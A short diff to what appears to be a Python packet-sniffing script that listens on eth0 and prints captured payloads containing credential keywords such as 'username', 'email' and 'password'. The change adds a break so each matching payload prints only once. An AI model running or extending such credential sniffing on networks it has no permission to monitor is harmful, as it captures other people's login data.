@@ -14,6 +14,7 @@ def process_sniffed_packet(packet):
             keywords = ['username', 'user', 'email', 'e-mail', "Email", "pass", "password", "login"]
             for keyword in keywords:
                 if keyword in load:
-                    print(load)  # here the problem is that we have add the break statement at last because in any website there is a presence of more than one matched keywords then for loop will print it serveral time 
-
+                    print(load)
+                    break
+                    
 sniff("eth0")
